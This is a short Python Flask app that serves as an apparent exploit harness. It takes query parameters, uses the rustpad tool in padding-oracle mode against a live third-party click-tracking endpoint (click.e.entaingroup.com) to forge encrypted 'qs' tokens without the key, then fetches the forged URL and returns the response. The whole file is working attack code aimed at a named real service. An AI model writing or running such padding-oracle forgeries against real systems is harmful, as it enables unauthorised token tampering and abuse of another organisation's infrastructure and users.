from flask import Flask
from flask import request
import subprocess
import requests

app = Flask(__name__)


@app.route('/')
def hello():
    s = request.args.get('s')
    b = request.args.get('b')
    d = request.args.get('d')
    m = request.args.get('m')
    n = request.args.get('n')
    v = request.args.get('v')
    if None in [s,b,d,m,n,v]:
        return f'Missing parameters {[s,b,d,m,n,v]}'
    new_pt = f"&v={v}&b={b}&d={d}&m={m}&n={n}&s={s}"
    new_ct_blocks = (len(new_pt) // 8) + 2
    output = subprocess.run(["./rustpad", "web", "--oracle", "https://click.e.entaingroup.com/?qs=CTEXT", "-D", "0000000000000000", "-E", new_pt, "-B", str(8), "--no-iv", "-t", str(100)], capture_output=True)
    new_ct_raw = output.stdout.decode('utf-8').strip()
    new_ct = new_ct_raw[-(new_ct_blocks * 8)*2:]
    ct_base = "de84a165e479c6665eae5a662d82cdb7"
    test_url = f"https://click.e.entaingroup.com/?qs={ct_base}{new_ct}"
    response = requests.get(test_url, allow_redirects=False)
    return response.text, response.status_code
